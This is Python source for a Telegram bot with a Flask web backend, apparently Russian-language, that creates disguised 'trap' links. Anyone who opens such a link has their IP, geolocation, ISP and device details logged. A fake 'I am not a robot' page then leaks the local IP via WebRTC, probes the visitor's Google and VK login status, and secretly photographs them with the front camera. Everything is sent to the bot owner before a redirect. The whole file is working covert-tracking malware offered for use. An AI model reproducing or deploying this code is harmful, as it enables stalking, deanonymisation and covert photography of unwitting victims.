import telebot, requests, os, uuid
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

# Временная база в памяти (на Vercel живет до перезагрузки сервера)
db = {} 

@app.route('/')
def home():
    return f'''
    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
        <h1 style="margin-bottom:20px;">🛡️ CORE SYSTEM ACTIVE</h1>
        <a href="/activate" style="padding:15px 35px;background:#0088cc;color:#fff;text-decoration:none;border-radius:12px;font-weight:bold;box-shadow:0 0 25px #0088cc;transition:0.3s;">⚡ АКТИВИРОВАТЬ БОТА</a>
    </body>
    '''

@app.route('/activate')
def activate():
    webhook_url = f"https://{request.host}/{API_TOKEN}"
    if bot.set_webhook(url=webhook_url):
        return f"✅ СИСТЕМА ЗАПУЩЕНА: {webhook_url}"
    return "❌ ОШИБКА АКТИВАЦИИ"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return "!", 200
    return "forbidden", 403

@app.route('/v/<uid>')
def logger(uid):
    if uid not in db: return "URL EXPIRED", 404
    
    owner_id = db[uid]['owner']
    target = db[uid]['url']
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('user-agent')
    
    g_info = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g_info = (f"🌍 {r['country']}, {r['city']}\n📡 Провайдер: {r['isp']}\n"
                      f"🛡 VPN/Proxy: {'ДА' if r['proxy'] or r['hosting'] else 'НЕТ'}")
    except: pass
    
    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n👤 IP: `{ip}`\n{g_info}\n📱 UA: `{ua}`", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
        <div id="ui">
            <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
            <h2 style="margin:0 0 10px 0;">Безопасный переход</h2>
            <p style="color:#888;margin-bottom:30px;">Нажмите "Я НЕ РОБОТ" для подтверждения</p>
            <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;font-size:16px;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('go');
        btn.onclick = async () => {{
            btn.innerText = "Синхронизация...";
            let d = {{
                uid: "{uid}",
                hw: {{ scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory || "N/A" }},
                net: {{ tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lang: navigator.language, local_ip: "N/A" }},
                social: {{ google: false, vk: false }},
                motion: "static"
            }};

            // WebRTC Leak
            try {{
                const pc = new RTCPeerConnection(); pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = i => {{ if(i.candidate) {{ let ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate); if(ip) d.net.local_ip = ip[0]; }} }};
            }} catch(e) {{}}

            // Детект соцсетей
            const check = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r(true); i.onerror=()=>r(false); i.src=u; }});
            d.social.google = await check("https://accounts.google.com");
            d.social.vk = await check("https://vk.com");

            // Акселерометр
            window.ondevicemotion = e => {{ if(e.acceleration.x > 0.1) d.motion = "moving"; }};

            await fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const v = document.getElementById('v'); v.srcObject = s;
                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, '1.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            s.getTracks().forEach(t => t.stop());
                            window.location.href = "{target}";
                        }});
                    }}, 'image/jpeg', 0.7);
                }}, 1000);
            }} catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    if d and d['uid'] in db:
        m = (f"🖥 *ДЕТАЛИ УСТРОЙСТВА ID:* `{d['uid']}`\n\n"
             f"📱 Экран: `{d['hw']['scr']}`\n"
             f"🧠 Ядра: `{d['hw']['cores']}` | RAM: `{d['hw']['ram']}GB`\n"
             f"🏠 Local IP: `{d['net']['local_ip']}`\n"
             f"🕒 Пояс: `{d['net']['tz']}`\n"
             f"👤 Вошел в: `G:{'✅' if d['social']['google'] else '❌'}` | `VK:{'✅' if d['social']['vk'] else '❌'}`\n"
             f"🏃 Движение: `{d['motion']}`")
        bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid, file = request.form.get('uid'), request.files.get('photo')
    if uid in db and file:
        bot.send_photo(db[uid]['owner'], file.read(), caption=f"📸 *ЛИЦО ОБЪЕКТА* (ID: `{uid}`)")
    return "ok"

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "🤖 *Система сбора данных активна.*\n\nПришли ссылку на Telegraph, чтобы создать персональную ловушку.", parse_mode="Markdown")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    uid = str(uuid.uuid4())[:8]
    db[uid] = {'owner': m.chat.id, 'url': url}
    bot.reply_to(m, f"✅ *Твоя ловушка готова:*\n\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")
